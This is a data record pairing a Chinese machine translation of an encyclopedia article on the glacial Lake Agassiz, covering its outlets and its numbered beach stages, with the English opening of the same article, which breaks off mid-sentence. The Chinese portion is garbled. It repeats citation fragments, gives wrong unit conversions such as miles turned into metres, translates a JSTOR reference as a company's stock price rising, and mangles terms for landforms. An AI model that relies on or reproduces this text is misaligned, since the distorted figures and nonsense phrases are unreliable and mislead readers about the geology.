ff0c\u5728\u6d77\u9f9f\u5c71\u8109\u7684\u897f\u4fa7\u5f62\u6210\u4e86\u4e00\u4e2a\u65b0\u6708\u3002Souris\u6e56\u6709\u4e09\u4e2a\u8fde\u7eed\u7684\u51fa\u53e3\uff1aSheyenne\u6cb3\uff0cPembina\u6cb3\uff0c\u6700\u540e\u662fAssiniboine\u6cb3\u3002[21][22]\u6700\u521d\uff0c\u5357\u6e7e\u7684Souris\u6e56\u6392\u5165\u7ea2\u6cb3\u652f\u6d41Sheyenne\u6cb3\uff0cSheyenne\u6cb3\u53c8\u6d41\u5165\u963f\u52a0\u897f\u6e56(Lake Agassiz)\u3002[23]\u7136\u800c\uff0c\u5728\u51b0\u76d6\u9000\u7f29\u5230\u8db3\u4ee5\u9732\u51fa\u9f9f\u5c71\u4e4b\u540e\uff0c\u5317\u8fb9\u7684\u82cf\u4f0a\u65af\u6e56\u6d77\u6e7e\u5728\u73b0\u4ee3\u82cf\u4f0a\u65af\u6cb3\u7684\u5f2f\u5934\u5904\u627e\u5230\u4e86\u4e00\u4e2a\u51fa\u53e3\uff1b\u5f2f\u5934\u4f4d\u4e8e\u73b0\u5728\u7684\u82cf\u4f0a\u65af\u6cb3\u53e3\u897f\u5357\u7ea618\u82f1\u91cc(29\u516c\u91cc)\u5904\u3002[19]\uff1a57\u6e56\u7684\u6c34\u4ece\u8fd9\u4e2a\u8098\u90e8\u5411\u4e1c\u5357\u6d41\u5165\u5f6d\u6bd4\u7eb3\u6cb3\uff0c\u5f6d\u6bd4\u7eb3\u6cb3\u73b0\u5728\u662f\u7ea2\u6cb3\u7684\u4e00\u6761\u652f\u6d41[19]\uff1a57-58\uff0c268\uff0c\u5f6d\u6bd4\u7eb3\u6cb3\u4f9d\u6b21\u8fdb\u5165\u963f\u52a0\u897f\u65af\u6e56\u7684\u963f\u897f\u5c3c\u535a\u56e0\u6e7e\u3002[19]\uff1a[19]\uff1a57-58\uff0c268\u5206[19]\uff1a57-58\uff0c268\u5206[19]\uff1a57-58\uff0c268\u5206[19]\uff1a57-58\uff0c268\u5206[19]\uff1a57\uff1b[24]\u5f53\u51b0\u76d6\u5728\u963f\u897f\u5c3c\u535a\u56e0\u6cb3\u4ee5\u5317\u6d88\u9000\u65f6\uff0c\u7d22\u4f0a\u65af\u6e56\u901a\u8fc7\u8fd9\u6761\u6cb3\u6392\u5165\u963f\u52a0\u897f\u65af\u6e56\u3002[25]\u9a6c\u5c3c\u6258\u5df4\u7701\u6717\u65af\u6cb3\u8c37\u7684\u9e48\u9e55\u6e56\u5360\u636e\u4e86\u66fe\u7ecf\u7684Souris\u6e56\u7684\u5317\u5cb8\u3002[26][26])\u3002\n\u5728\u963f\u52a0\u897f\u6e56\u5f00\u59cb\u5411\u4e1c\u5317\u6d41\u4e4b\u524d\uff0c\u9760\u8fd1\u9521\u8fbe\u6e56\u6cb3\u53e3\u7684\u8428\u65af\u5580\u5f7b\u6e29\u6cb3\u6d41\u57df\u7684\u8f83\u4f4e\u90e8\u5206\u5df2\u7ecf\u8131\u79bb\u4e86\u51b0\u539f\u3002[19]\u8428\u65af\u5580\u5f7b\u6e29\u6e56\u4f4d\u4e8e\u8428\u65af\u5580\u5f7b\u6e29\u7701\u8428\u65af\u5361\u901a\u548c\u963f\u5c14\u4f2f\u7279\u738b\u5b50\u4e4b\u95f4\u7684\u5317\u8428\u65af\u5580\u5f7b\u6e29\u6cb3\u7ea6135\u82f1\u91cc(217\u516c\u91cc)\u5904\u3002\u5728\u8428\u65af\u5580\u5f7b\u6e29\u6e56\u51fa\u53e3\u4ee5\u4e1c\u51e0\u82f1\u91cc\u5904\uff0c\u9760\u8fd1\u5357\u5317\u5206\u652f\u7684\u73b0\u4ee3\u4ea4\u6c47\u5904\uff0c\u5b83\u8fdb\u5165\u4e86\u963f\u52a0\u897f\u6e56\u3002\u8fd9\u4e2a\u8428\u65af\u5580\u5f7b\u6e29\u6e7e\u6cbf\u7740\u73b0\u4ee3\u7684\u8428\u65af\u5580\u5f7b\u6e29\u6cb3\u8def\u7ebf\u5ef6\u4f38\u4e86400\u82f1\u91cc(640\u516c\u91cc)\u3002[19]\u3002\n\u51f8\u8d77\u7684\u6d77\u6ee9\u8ddd\u79bb\u4efb\u4f55\u6c34\u57df\u90fd\u6709\u8bb8\u591a\u516c\u91cc\uff0c\u6807\u5fd7\u7740\u4ee5\u524d\u7684\u6e56\u6cca\u8fb9\u754c\u3002\u5f53\u7ea2\u6cb3\u4ece\u5357\u5411\u5317\u9010\u6e10\u4e0b\u964d\u65f6\uff0c\u7531\u4e8e\u51b0\u5ddd\u4ee5\u6765\u7684\u5747\u8861\u53cd\u5f39\uff0c\u8fd9\u4e9b\u53e4\u8001\u7684\u6d77\u5cb8\u7ebf\u968f\u7740\u4e00\u4e2a\u4eba\u5411\u5317\u4e0a\u5347\u3002[6]\u3002\n\u963f\u52a0\u897f\u6e56\u7684\u6700\u9ad8\u6d77\u5cb8\u88ab\u79f0\u4e3a\u8d6b\u5c14\u66fc\u6d77\u6ee9\u3002\u5b83\u662f\u4ee5\u660e\u5c3c\u82cf\u8fbe\u5dde\u683c\u5170\u7279\u53bf\u7684\u8d6b\u5c14\u66fc\u547d\u540d\u7684\u3002\u8d6b\u5c14\u66fc\u6d77\u6ee9\u662f\u6700\u9ad8\u7684\u6d77\u5cb8\u7ebf\uff0c\u53ef\u4ee5\u4ece\u660e\u5c3c\u82cf\u8fbe\u5dde\u548c\u5357\u8fbe\u79d1\u4ed6\u5dde\u4ea4\u754c\u5904\u7279\u62c9\u5f17\u65af\u6e56\u7684\u5386\u53f2\u51fa\u53e3\u8ffd\u6eaf\u5230\u3002\u6d77\u6ee9\u5728\u6d77\u62d4973\u82f1\u5c3a(297\u7c73)\u5230976\u82f1\u5c3a(297\u7c73)\u4e4b\u95f4\u6ce2\u52a8\u3002\u7279\u62c9\u7ef4\u65af\u6e56\u6d77\u62d4971\u82f1\u5c3a(296\u7c73)\uff0c\u4f4d\u4e8e\u5e03\u6717\u5c71\u8c37\u7684\u7279\u62c9\u5f17\u65af\u5ce1\u8c37(Traverse Gap)\uff0c\u6d77\u62d4980\u82f1\u5c3a(300\u7c73)\u3002[27]\u8fd9\u662f\u963f\u52a0\u897f\u6e56\u7684\u5357\u51fa\u53e3\u3002[28][28]\u3002\n\u8d6b\u5c14\u66fc\u6d77\u6ee9\u5c55\u793a\u4e86\u8bb8\u591a\u6d41\u5165\u963f\u52a0\u897f\u6e56\u7684\u4e3b\u8981\u6cb3\u6d41\u7684\u4e09\u89d2\u6d32\u3002\u5728\u660e\u5c3c\u82cf\u8fbe\u5dde\u548c\u5317\u8fbe\u79d1\u4ed6\u5dde\uff0c\u8fd9\u4e9b\u5730\u533a\u5305\u62ec\u5e03\u6cd5\u7f57\u6cb3\u4e09\u89d2\u6d32\u3001\u6c99\u5c71\u6cb3\u4e09\u89d2\u6d32\u3001\u8c22\u8036\u6069\u6cb3\u4e09\u89d2\u6d32\u3001\u9e8b\u9e7f\u8c37\u4e09\u89d2\u6d32\u548c\u5f6d\u6bd4\u7eb3\u6cb3\u4e09\u89d2\u6d32\u3002\u5728\u9a6c\u5c3c\u6258\u5df4\u7701\uff0c\u6709\u963f\u897f\u5c3c\u535a\u56e0\u6cb3\u4e09\u89d2\u6d32\u3002[28][28]\n\u8bfa\u514b\u7f57\u65af\u9636\u6bb5\u7684\u6d77\u6ee9\uff1a\u8bfa\u514b\u7f57\u65af\u6d77\u5cb8\u7ebf\u4f4d\u4e8e\u8d6b\u5c14\u66fc\u6d77\u5cb8\u9644\u8fd1\uff0c\u4f4d\u4e8e\u88ab\u4fb5\u8680\u7684\u7281\u5730\u659c\u5761\u4e0a\u3002[27][27]\u3002\n\u5ef7\u5854\u9636\u6bb5\u7684\u6d77\u6ee9\uff1a\u5ef7\u5854\u6d77\u6ee9\u6d77\u62d41040\u82f1\u5c3a(320\u7c73)\u81f31055\u82f1\u5c3a(322\u7c73)\u3002[27][27]\u3002\n\u574e\u8d1d\u5c14\u9636\u6bb5\u7684\u6d77\u6ee9\uff1a\u8fd9\u4e9b\u6d77\u6ee9\u7684\u5256\u9762\u5f88\u53d1\u8fbe\uff0c\u5f53\u6e56\u6cca\u505c\u6b62\u5411\u5357\u6d41\u5165\u6c83\u4f26\u6cb3\u65f6\uff0c\u8fd9\u5bf9\u786e\u5b9a\u6e56\u6cca\u7684\u8fb9\u754c\u5f88\u6709\u7528\u3002[27][27]\u3002\n\u9ea6\u8003\u5229\u7ef4\u5c14\u821e\u53f0\u7684\u6d77\u6ee9\uff1a\u4ece\u963f\u52a0\u897f\u6e56\u6d41\u51fa\u7684\u6c83\u4f26\u6cb3\u6cb3\u9053\u4fb5\u8680\u4e86\u7279\u62c9\u5f17\u65af\u6e56\u548c\u5927\u77f3\u6e56\u6c34\u4f4d\u4ee5\u4e0b\u7684\u6cb3\u9053\uff0c\u6df1\u8fbe935\u82f1\u5c3a(285\u7c73)\uff0c\u662f\u7279\u62c9\u5f17\u65af\u6e56\u6700\u6df1\u7684\u90e8\u5206\u3002\u9ea6\u8003\u5229\u7ef4\u5c14\u6d77\u5cb8\u7ebf\u7684\u5357\u90e8\u4e0e\u7279\u62c9\u5f17\u65af\u6e56\u7684\u6c34\u4f4d\u9ad8\u4f4e\u4e0d\u8c0b\u800c\u5408\uff0c\u7279\u62c9\u5f17\u65af\u6e56\u7684\u6c34\u4f4d\u5927\u7ea6\u5728\u6d77\u62d4976\u82f1\u5c3a(297\u7c73)\u5230970\u82f1\u5c3a(300\u7c73)\u4e4b\u95f4\u3002[27][27]\u3002\n\u963f\u52a0\u897f\u6e56\u768414\u6761\u6d77\u5cb8\u7ebf\u5df2\u7ecf\u786e\u5b9a\uff0c\u5b83\u4eec\u4f4d\u4e8e\u9ea6\u8003\u5229\u7ef4\u5c14\u6d77\u6ee9\u4e4b\u4e0b\u3002\u8fd9\u4e9b\u90fd\u662f\u5728\u6c83\u4f26\u6cb3\u4e0d\u80fd\u518d\u63a5\u6536\u6e56\u6c34\u6d41\u51fa\u65f6\u5f62\u6210\u7684\u3002\u5f53\u53d1\u73b0\u4e00\u4e2a\u8f83\u4f4e\u7684\u51fa\u53e3\uff0c\u6e56\u6c34\u968f\u7740\u6e56\u6c34\u7684\u91ca\u653e\u800c\u840e\u7f29\u65f6\uff0c\u5c31\u4f1a\u53d1\u751f\u8fd9\u79cd\u60c5\u51b5\u3002[29]\u6700\u9ad8\u7684\u4e09\u4e2a\u6d77\u5cb8\u7ebf\u88ab\u547d\u540d\u4e3a\u5e03\u5170\u67e5\u5fb7\u6d77\u6ee9\uff0c\u63a5\u4e0b\u6765\u7684\u4e94\u4e2a\u6309\u964d\u5e8f\u662f\u5e0c\u5c14\u65af\u4f2f\u52d2\u6d77\u6ee9\u3001\u4e24\u4e2a\u57c3\u9ed8\u62c9\u591a\u6d77\u6ee9\u548c\u4e24\u4e2a\u5965\u54c8\u5854\u6d77\u6ee9\uff0c\u5b83\u4eec\u6765\u81ea\u5317\u8fbe\u79d1\u4ed6\u5dde\u7403\u573a\u4e0a\u6216\u9644\u8fd1\u7684\u57ce\u9547\u3002[29][29]\u3002\n\u5e03\u5170\u67e5\u5fb7\u9636\u6bb5\u7684\u6d77\u6ee9(\u5e0c\u5c14\u65af\u4f2f\u52d2\u6d77\u6ee9)\uff1a\u5317\u8fbe\u79d1\u4ed6\u5dde\u5e03\u5170\u67e5\u5fb7\u9644\u8fd1\u8fde\u7eed\u4e09\u7ea7\u7684\u6e56\u53e3\u3002\u5b83\u4eec\u7531\u660e\u5c3c\u82cf\u8fbe\u5dde\u6b27\u51e0\u91cc\u5fb7\u4e1c\u53575\u82f1\u91cc(8.0\u516c\u91cc)\u81f37\u82f1\u91cc(11\u516c\u91cc)\u4ee5\u53ca\u9a6c\u5c3c\u6258\u5df4\u7701\u4e2d\u9014\u7ad9\u9644\u8fd1\u7684\u6c99\u5b50\u548c\u783e\u77f3\u6c89\u79ef\u6307\u793a[29]\u4e0b\u4e00\u4e2a\u8f83\u4f4e\u7684\u6d77\u6ee9\u88ab\u79f0\u4e3a\u5e0c\u5c14\u65af\u4f2f\u52d2\u6d77\u6ee9\uff0c\u53ef\u4ee5\u5728\u660e\u5c3c\u82cf\u8fbe\u5dde\u683c\u6797\u767b\u9644\u8fd1\u770b\u5230\uff0c\u5728\u660e\u5c3c\u82cf\u8fbe\u5dde\u514b\u9c81\u514b\u65af\u987f\u4ee5\u53175\u82f1\u91cc(8.0\u516c\u91cc)\u81f315\u82f1\u91cc(24\u516c\u91cc)\u5904\u53ef\u89c1\u3002[29][29]\u3002\nEmerado\u9636\u6bb5\u7684\u6d77\u6ee9\uff1aEmerado\u6d77\u5cb8\u7ebf\uff0c\u6d77\u62d4\u7ea6885\u82f1\u5c3a(270\u7c73)\u3002\u5b83\u7684\u5357\u7aef\u4f4d\u4e8e\u660e\u5c3c\u82cf\u8fbe\u5dde\u7684\u514b\u62c9\u683c\u5185\u65af\u548c\u5317\u8fbe\u79d1\u4ed6\u5dde\u7684\u54c8\u4f0d\u5fb7\u4e4b\u95f4\u7684\u7ea2\u6cb3\u5bf9\u5cb8\u3002\u8fd9\u6761\u5355\u4e00\u7684\u6d77\u5cb8\u7ebf\u6e05\u695a\u5730\u8868\u660e\uff0c\u5b83\u5c5e\u4e8e\u6e56\u6c34\u5411\u4e1c\u5317\u6d41\u5411\u5176\u51fa\u6c34\u53e3\u7684\u65f6\u671f\u3002\u5730\u58f3\u53cd\u5f39\u66f4\u5927\u7684\u662f\u5317\u90e8\uff0c\u9a6c\u5c3c\u6258\u5df4\u7701\u7684\u57c3\u9ed8\u62c9\u591a\u6d77\u6ee9\u6bd4\u90a3\u91cc\u9ad810\u82f1\u5c3a(3.0\u7c73)\u523020\u82f1\u5c3a(6.1\u7c73)\u3002[29][29]\u3002\n\u5965\u54c8\u5854\u9636\u6bb5\u7684\u6d77\u6ee9\uff1a\u5965\u54c8\u5854\u4e0a\u6e38\u6d77\u5cb8\u7ebf\u5728\u660e\u5c3c\u82cf\u8fbe\u5dde\u4f69\u5229\u548c\u5317\u8fbe\u79d1\u4ed6\u5dde\u8bfa\u5e03\u5c14\u9644\u8fd1\u6d77\u62d4870\u82f1\u5c3a(270\u7c73)\u5230875\u82f1\u5c3a(267\u7c73)\u4e4b\u95f4\u3002\u5728\u660e\u5c3c\u82cf\u8fbe\u5dde\uff0c\u5b83\u4f4d\u4e8e\u7ea2\u6cb3\u4ee5\u4e1c2\u82f1\u91cc(3.2\u516c\u91cc)\u52306\u82f1\u91cc(9.7\u516c\u91cc)\u5904\u3002\u4e00\u4e9b\u6d77\u5cb8\u4ee5\u6d77\u6ee9\u810a\u4e3a\u6807\u5fd7\uff0c\u7279\u522b\u662f\u5728\u5317\u9762\uff0c\u90a3\u91cc\u7684\u8868\u9762\u662f\u5e73\u6574\u7684\u3002[29][29]\nGladstone\u6d77\u6ee9\uff1aGladstone\u6d77\u6ee9\u5f62\u6210\u65f6\u7684\u963f\u52a0\u897f\u6e56\u5357\u7aef\u4f4d\u4e8e\u5317\u8fbe\u79d1\u4ed6\u5dde\u8d1d\u5c14\u8499\u7279\u9644\u8fd1\uff0c\u4f4d\u4e8e\u5927\u798f\u514b\u65af\u4ee5\u535720\u7c73(0.020\u516c\u91cc)\uff0c\u6d77\u62d4845\u82f1\u5c3a(258m)\u3002\u5b83\u5411\u5317\u5ef6\u4f38\u7ea610\u82f1\u91cc(16\u516c\u91cc)\uff0c\u4f4d\u4e8e\u7ea2\u6cb3\u4ee5\u4e1c\u3002[29][29]\u3002\n\u4f2f\u6069\u8d5b\u5fb7\u6d77\u6ee9\uff1a\u4f2f\u6069\u8d5b\u5fb7\u6d77\u6ee9\u5728\u5317\u8fbe\u79d1\u4ed6\u5dde\u7684\u5927\u798f\u514b\u65af\u6a2a\u8de8\u7ea2\u6cb3\uff0c\u5411\u4e1c\u5317\uff0c\u7136\u540e\u5411\u5317\uff0c\u4e0e\u7ea2\u6cb3\u5e73\u884c\uff0c\u4ee5\u4e1c10\u7c73(0.010\u516c\u91cc)\u81f313\u7c73(0.013\u516c\u91cc)\u3002\u8fd9\u4e2a\u6d77\u6ee9\u5728\u56fd\u9645\u8fb9\u754c\u4ee5\u5357\u6a21\u7cca\u4e0d\u6e05\u3002\u6d77\u6ee9\u4f4d\u4e8e\u6d77\u62d4835\u82f1\u5c3a(255\u7c73)\u5230840\u82f1\u5c3a(260\u7c73)\u4e4b\u95f4\u3002[29][29]\u3002\n\u5965\u7d22\u74e6\u6d77\u6ee9\uff1a\u5965\u7d22\u74e6\u6d77\u6ee9\u4f4d\u4e8e\u56fd\u9645\u8fb9\u754c\u4ee5\u5357\u51e0\u82f1\u91cc\u5904\u3002\u6d77\u6ee9\u4f4d\u4e8e\u6d77\u62d4815\u82f1\u5c3a(248\u7c73)\u5230820\u82f1\u5c3a(250\u7c73)\u4e4b\u95f4\u3002[29][29]\u3002\n\u77f3\u5899\u6d77\u6ee9\uff1a\u5728\u9a6c\u5c3c\u6258\u5df4\u7701\u7684\u77f3\u5899\uff0c\u6709\u4e00\u67610.33\u82f1\u91cc(0.53\u516c\u91cc)\u6216\u66f4\u957f\u7684\u660e\u663e\u7684\u6d77\u6ee9\u5c71\u810a\u3002\u5b83\u7684\u9876\u5cf0\u6d77\u62d4820\u82f1\u5c3a(250\u7c73)\u5230825\u82f1\u5c3a(251\u7c73)\uff0c\u6df1\u5ea6\u7ea610\u82f1\u5c3a(3.0\u7c73)\u3002\u5c5e\u4e8e\u8fd9\u4e00\u9636\u6bb5\u7684\u6d77\u6ee9\u6c89\u79ef\u5728\u9a6c\u5c3c\u6258\u5df4\u7701\u5357\u90e8\u7684\u5176\u4ed6\u5730\u65b9\u6ca1\u6709\u89c2\u5bdf\u5230\u3002\u636e\u4fe1\uff0c\u4ed6\u4eec\u88ab\u57cb\u846c\u7684\u5927\u90e8\u5206\u65f6\u95f4\u662f\u4ece\u8fb9\u5883\u7684\u7f8e\u56fd\u4e00\u4fa7\uff0c\u5411\u5317\u5230\u6e29\u5c3c\u4f2f[29]\u3002\n\u5c3c\u5f17\u7ef4\u5c14\u821e\u53f0\u7684\u6d77\u6ee9\uff1a\u5c3c\u5f17\u7ef4\u5c14\u4e1c\u5357\u7ea60.5\u82f1\u91cc(0.8\u516c\u91cc)\uff0c\u8fd9\u6761\u8def\u7a7f\u8fc7\u8fd9\u4e2a\u6d77\u6ee9\u3002\u5b83\u7684\u9876\u5cf0\u6d77\u62d4777\u82f1\u5c3a(237\u7c73)\u5230778\u82f1\u5c3a(237\u7c73)\u3002\u5b83\u9ad8\u51fa\u5468\u56f4\u8868\u97624\u82f1\u5c3a(1.2\u7c73)\u3002\u5b83\u4ece\u5c3c\u5f17\u7ef4\u5c14\u8f66\u7ad9\u9644\u8fd1\u5f00\u59cb\uff0c\u5411\u4e1c\u5357\u65b9\u5411\u5ef6\u4f38\u81f3\u5c11\u4e00\u82f1\u91cc\u3002\u5411\u5357\u7ea60.33\u82f1\u91cc(0.53\u516c\u91cc)\u5904\uff0c\u6d77\u62d4780\u82f1\u5c3a(240\u7c73)\u5904\u4e5f\u6709\u7c7b\u4f3c\u7684\u6d77\u6ee9\u810a\u5cf0\u3002\u5b83\u6bd4\u5730\u9762\u9ad8\u51fa2\u82f1\u5c3a(0.61m)\u52304\u82f1\u5c3a(1.2m)\u3002\u5b83\u7684\u5927\u90e8\u5206\u90fd\u662f\u584c\u9677\u7684\uff0c\u5168\u5e74\u90fd\u6709\u6c34\uff0c\u6d77\u6ee9\u9876\u5cf0\u7684\u6d77\u62d4\u5728\u6d77\u62d4782\u82f1\u5c3a(238\u7c73)\u5230784\u82f1\u5c3a(239\u7c73)\u4e4b\u95f4\u3002[29][29]\u3002\n\u7ea2\u6cb3\u8c37\u7684\u80a5\u6c83\u571f\u58e4\u73b0\u5728\u88ab\u5317\u65b9\u7684\u7ea2\u6cb3\u6392\u5e72\uff0c\u662f\u7531\u963f\u52a0\u897f\u6e56\u7684\u6de4\u6ce5\u6c89\u79ef\u800c\u6210\u7684\u3002[6][30]\u3002\n\u201ca b c d e f g h i j k l m n o p q s tu\u7814\u7a76\u963f\u52a0\u897f\u6e56\u7684\u8fdb\u7a0b\u548c\u7ec8\u6b62\u201d\uff0c\u8fc8\u514b\u5c14\u00b7J\u00b7\u7c73\u54c8\u83b1\u514b\uff0c2013\u5e744\u670823\u65e5\u3002\n^a b c.Perkins S(2002)\u3002\u4ece\u524d\u5728\u4e00\u4e2a\u6e56\u4e0a\u3002\u79d1\u5b66\u65b0\u95fb\u3002162(18)\uff1a283-284\u300210.2307/4014064\u3002\u8054\u5408\u5305\u88f9\u670d\u52a1\u516c\u53f8\u80a1\u4ef7\u4e0a\u6da84014064\u30022009\u5e742\u670828\u65e5\u4ece\u539f\u4ef6\u5b58\u6863\u3002\n\u5a01\u5ec9\u00b7H\u00b7\u57fa\u5ef7(1824)\u3002\u5bf9\u5723\u5f7c\u5f97\u6cb3\u6e90\u5934\u3001\u6e29\u5c3c\u76ae\u514b\u6e56\u3001\u4f0d\u5179\u6e56\u3001\u2026\u7684\u63a2\u9669\u53d9\u8ff0\u3002\u3002\u5377\u30022.\u7f8e\u56fd\u5bbe\u5915\u6cd5\u5c3c\u4e9a\u5dde\u8d39\u57ce\uff1aH.C.Cary&amp\uff1bI.Lea.\u3002\u7b2c7\u9875\uff1a\u4ece\u7b2c7\u9875\u5f00\u59cb\uff0c\u6709\u4e9b\u5730\u65b9\u9e45\u5375\u77f3\u5f88\u591a\uff0c\u5c31\u50cf\u6211\u4eec\u5728\u67d0\u4e2a\u4ee5\u524d\u7684\u6cb3\u6d41\u6216\u6e56\u6cca\u7684\u6cb3\u5e8a\u4e0a\u65c5\u884c\u4e00\u6837\uff1b\u5934\u8111\u5f92\u52b3\u5730\u52aa\u529b\u4e3a\u5e7f\u9614\u7684\u6c34\u57df\u8bbe\u5b9a\u754c\u9650\uff0c\u800c\u5728\u4ee5\u524d\u7684\u67d0\u4e00\u5929\uff0c\u8fd9\u7247\u6c34\u57df\u80af\u5b9a\u4f1a\u6cdb\u6ee5\u6574\u4e2a\u56fd\u5bb6\u3002\n\u6c83\u4f26\u00b7\u5384\u666e\u6c49\u59c6(1880\u5e74)\u3002\u660e\u5c3c\u82cf\u8fbe\u5dde\u4e2d\u90e8\u548c\u897f\u90e8\u7684\u5730\u8d28\u5b66\u3002\u4e00\u4efd\u521d\u6b65\u62a5\u544a\u3002[\u6458\u81ea1879\u5e74\u8fdb\u5ea6\u7efc\u5408\u62a5\u544a\u3002]\u3002\u7f8e\u56fd\u660e\u5c3c\u82cf\u8fbe\u5dde\u5723\u4fdd\u7f57\uff1a\u5148\u950b\u51fa\u7248\u793e\uff0c\u7b2c18\u9875\u3002\u6458\u81ea\u7b2c18\u9875\uff1a&#34\uff1b\u56e0\u4e3a\u5b83\u4e0e\u6b63\u5728\u6d88\u9000\u7684\u5927\u9646\u51b0\u76d6\u6709\u5173\uff0c\u6240\u4ee5\u5efa\u8bae\u5c06\u8fd9\u4e2a\u6e56\u547d\u540d\u4e3a\u963f\u52a0\u897f\u6e56\uff0c\u4ee5\u7eaa\u5ff5\u7b2c\u4e00\u4f4d\u4e3b\u5f20\u6f02\u79fb\u662f\u7531\u9646\u51b0\u4ea7\u751f\u7684\u7406\u8bba\u7684\u6770\u51fa\u5021\u5bfc\u8005\u3002\n\u51b0\u5ddd\u8fb9\u7f18\u7684\u9000\u7f29\u4e0d\u662f\u7531\u51b0\u5ddd\u6d41\u52a8\u7684\u9006\u8f6c\u5f15\u8d77\u7684\uff0c\u800c\u662f\u7531\u51b0\u76d6\u878d\u5316\u5f15\u8d77\u7684\u3002\n^a b c Ojakangas RW\uff0cMatsch CL(1982)\u3002\u660e\u5c3c\u82cf\u8fbe\u5dde\u7684\u5730\u8d28\u5b66\u3002\u660e\u5c3c\u82cf\u8fbe\uff1a\u660e\u5c3c\u82cf\u8fbe\u5927\u5b66\u51fa\u7248\u793e\u3002\u7b2c106-110\u9875\u3002ISBN978-0816609536\u3002\n\u8482\u83ab\u897f\u00b7G\u00b7\u8d39\u820d\u5c14\uff1b\u6770\u62c9\u5c14\u5fb7\u00b7G\u00b7\u53f2\u5bc6\u65af\uff1b\u7ea6\u7ff0\u00b7T\u00b7\u5b89\u5fb7\u9c81\u65af(2002)\u3002&#34\uff1b\u524d\u5bd2\u6b66\u7eaa\u632f\u8361\u662f\u7531\u3002\n..", "note_en": "Jump to navigation  Jump to search  A very large glacial lake in central North America at the end of the last glacial period\n   Lake Agassiz was a very large  glacial lake in central  North America. Fed by glacial meltwater at the end of the  last glacial period, its area was larger than all of the modern  Great Lakes combined  [2] though its mean depth was not as great as that of many major lakes today.\n First postulated in 1823 by  William H. Keating,  [3] it was named by  Warren Upham in 1879 after  Louis Agassiz, when Upham recognized that the lake was formed by glacial action.  [4]\n   During the last  Ice Age, northern North America was covered by an  ice sheet, which alternately advanced and retreated with variations in the climate. This continental ice sheet formed during the period now known as the  Wisconsin glaciation, and covered much of central North America between 30,000 and 10,000 years ago. As the ice sheet disintegrated,  [5] its meltwaters created an immense  proglacial lake.  [6]\n Around 13,000 years ago, this lake came to cover much of what are now  Manitoba, northwestern  Ontario, northern  Minnesota, eastern  North Dakota, and  Saskatchewan. At its greatest extent, it may have covered as much as 440,000\u00a0km 2 (170,000\u00a0sq\u00a0mi),  [7] larger than any currently existing lake in the world (including the  Caspian Sea) and approximately the area of the  Black Sea.\n At times the lake drained south through the  Traverse Gap into  Glacial River Warren (parent to the  Minnesota River, a tributary of the  Mississippi River),  [8] east through Lake Kelvin (modern  Lake Nipigon) to what is now  Lake Superior,  [9] and northwest through the  Clearwater Spillway to the  Mackenzie River System and the Arctic Ocean about 13,000 years ago.  [2]  [10]  [11]\n The ice returned to the south for a time, but as it again retreated north of the present  Canada\u2013United States border around 10,000 years ago, Lake Agassiz refilled. The last major shift in drainage occurred around 8,200 years ago. The melting of remaining  Hudson Bay ice caused Lake Agassiz to drain nearly completely. This final drainage of Lake Agassiz has been associated with an estimated 0.8 to 2.8\u00a0m (2.6 to 9.2\u00a0ft)  rise in global sea levels.  [12]\n  Lake Agassiz&#39;s major drainage reorganization events were of such magnitudes that they had significant impact on climate, sea level and possibly early  human civilization. The lake&#39;s enormous freshwater release into the Arctic Ocean has been postulated to have disrupted oceanic circulation and caused temporary cooling. The draining of 13,000 years ago may be the cause of the  Younger Dryas  stadial.  [2]  [13]  [14] Although disputed,  [15] the draining at 9,900\u201310,000 years ago may be the cause of the  8,200 yr climate event. A recent study by Turney and Brown links the 8,500-years ago drainage to the expansion of agriculture from east to west across Europe; they suggest that this may also account for various  flood myths of prehistoric cultures, including the  Biblical flood narrative.  [16]\n  The lowest point between the drainage of  Hudson Bay and the  Gulf of Mexico is in the  Traverse Gap between the U.S. states of  Minnesota and  South Dakota. It lies between  Lake Traverse and  Big Stone Lake.  [17] This continental divide is about 300 metres (980\u00a0ft) above sea level.  [18] When Lake Agassiz existed, the gap was the outlet of River Warren. The outflow from the melting glaciers filled Lake Agassiz and then drained through the gap to the Gulf of Mexico. This mass of moving water eroded a valley about 2\u20135 kilometres (1.2\u20133.1\u00a0mi) wide and from 100 feet (30\u00a0m) to 125 feet (38\u00a0m) deep.  [8]  [19] Today, this valley contains the  Minnesota River, joined by the  Upper Mississippi River at  Mendota, Minnesota. The northern part of the former lakebed is the valley of the  Red River of the North, which flows northward to  Lake Winnipeg.  [19]\n     During the Lockhart Phase, water accumulated in the Red River valley of  North Dakota and  Minnesota. As the water reached to the top of the divide to the south, the water drained into the ancestral  Minnesota and  Mississippi River system. This occurred while the Laurentian Ice Sheet was at or below the current Canada\u2013US border.  [1] As the ice sheet melted northward, an early Lake Agassiz covered southern  Manitoba, the Minnesota and  Ontario boundary country, and along the Red River south of  Fargo, North Dakota. The Lockhart phase is associated with the Herman lake stage (335 metres (1,099\u00a0ft)), the highest shoreline of Lake Agassiz. The  Big Stone Moraine formed the southern boundary of the lake. During the Lockhart Phase the lake is estimated to have been 231 metres (758\u00a0ft) deep, with greater depths near the glacier.  [1]\n  As the ice sheet melted northward, Lake Agassiz found a lower outlet through the  Kaministikwia route along the modern Minnesota\u2013Ontario border. This moved water to  Lake Duluth, a proglacial lake in the  Lake Superior basin. From there the water drained south via an ancestral  St. Croix and  Mississippi River system. The lake drained below the Herman lake beaches until  isostatic rebound and glacial advances closed the Kaministikwia route. This stabilized the lake at the Norcross lake stage (325 metres (1,066\u00a0ft)).  [1]  [20] The average depth of Lake Agassiz during the late Moorhead Phase was 258 metres (846\u00a0ft). Drainage from Lake Agassiz continued to flow southward out of the ancient Minnesota and Mississippi River systems into the Gulf of Mexico.  [1]\n  During the Emerson Phase, lake levels and drainage patterns continually fluctuated. The lake switched from a southward outlet to a northwestern outlet, and may have been static without a significant outlet during this phase. Isostatic rebound changed the altitude of the land, and this, combined with changes in the volume of meltwater from the ice margin and the closure of the Kaministikwia outlet in the east increased the size of the northern end of the lake.  [1] One hypothesis postulates that the lake was a \u2018 terminal lake\u2019 with water inflows and evapotranspiration being equal. Dating of the glacial moraines shows that the  Clearwater and  Athabasca River system and  Lake Nipigon and Minong basin were still ice-covered. A period of precipitation and meltwater input balance with the rate of evapotranspiration may have existed for a short period of time.  [1] During this phase, the Clearwater and Athabasca River system outlet opened. Isostatic rebound opened the southern outlet for a time, creating the Norcross (325 metres (1,066\u00a0ft)), Tintah (310 metres (1,020\u00a0ft)), and Upper Campbell (299 metres (981\u00a0ft)) beaches. The south outlet was permanently closed at the end of Emerson Phase.  [1]\n  The opening of the Kaministikwia outlet to the east initiated the onset of the Nipigon Phase. The lower 